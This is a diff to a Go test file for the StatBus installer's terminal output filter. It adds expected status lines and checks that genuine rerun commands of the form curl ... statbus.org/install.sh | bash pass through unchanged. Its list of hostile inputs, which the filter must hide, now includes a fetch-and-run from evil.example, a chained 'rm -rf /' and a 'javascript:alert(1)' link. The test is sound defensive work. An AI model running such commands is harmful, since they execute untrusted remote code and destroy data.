@@ -74,6 +74,9 @@ func TestInstallTerminalWriterReceivesEveryStepLine(t *testing.T) {
 		"HTTPS is not working yet: https://statbus-no-public-dns.invalid its certificate is not trusted (signed by an unknown authority)",
 		"HTTPS is not working yet: https://statbus-no-public-dns.invalid its certificate does not cover this name",
 		"HTTPS is not working yet: https://statbus-no-public-dns.invalid answered with HTTP status 500",
+		"HTTPS is not working yet: https://statbus-manual.statbus-test.local did not answer; statbus-manual.statbus-test.local is not a public name, so no automatic certificate can be issued for it",
+		"HTTPS is not working yet: https://statbus.example.org did not answer; public DNS does not send statbus.example.org to this server, so no automatic certificate can be issued yet",
+		"Waiting up to 1 minute for https://statbus.example.org to get its automatic certificate ...",
 	} {
 		input.WriteString(line + "\n")
 		want.WriteString(strings.TrimPrefix(line, "INSTALL_SERVICE: ") + "\n")
@@ -295,8 +298,10 @@ func TestInstallTerminalWriterShowsFinalProof(t *testing.T) {
 		"Visit: https://statbus.example:8443\n" +
 		"To check or repair this installation later, run:\n" +
 		"    cd ~/statbus && ./sb install\n"
+	// The upgrade-table record is written after the banner (a deferred step);
+	// it is bookkeeping for the install log, so the terminal ends with the
+	// rerun command.
 	want := "User accounts: 1\n" +
-		"  Recorded installed version v2026.10.5 in upgrade table\n" +
 		"All services are running and the API is ready.\n" +
 		"The advertised site https://statbus.example answers.\n" +
 		"The advertised site http://statbus.example:8080 answers.\n" +
@@ -311,10 +316,26 @@ func TestInstallTerminalWriterShowsFinalProof(t *testing.T) {
 	if got := runTerminalFilter(t, transcript); got != want {
 		t.Fatalf("final proof hidden or altered:\n got:\n%s\nwant:\n%s", got, want)
 	}
+	// install.sh hands the command the operator ran to ./sb install
+	// (STATBUS_INSTALL_RERUN_COMMAND), so the rerun line is that piped command,
+	// with its arguments and any environment install.sh carried over.
+	for _, rerun := range []string{
+		"curl -fsSL https://statbus.org/install.sh | bash",
+		"curl -fsSL https://statbus.org/install.sh | bash -s -- --version v2026.11.1-rc.07",
+		"curl -fsSL https://statbus.org/install.sh | bash -s -- --channel prerelease --non-interactive",
+		"curl -fsSL https://statbus.org/install.sh | env STATBUS_ENV_CONFIG=/home/statbus/statbus.env.config bash -s -- --non-interactive",
+	} {
+		input := "To check or repair this installation later, run:\n    " + rerun + "\n"
+		if got := runTerminalFilter(t, input); got != input {
+			t.Fatalf("rerun command hidden or altered:\n got:\n%s\nwant:\n%s", got, input)
+		}
+	}
 	for _, hostile := range []string{
 		"Visit: javascript:alert(1)",
 		"The advertised site not-a-url answers.",
 		"    cd /srv/statbus && rm -rf /",
+		"    curl -fsSL https://evil.example/install.sh | bash",
+		"    curl -fsSL https://statbus.org/install.sh | bash; rm -rf /",
 		"====================",
 	} {
 		if got := runTerminalFilter(t, hostile+"\n"); got != "" {
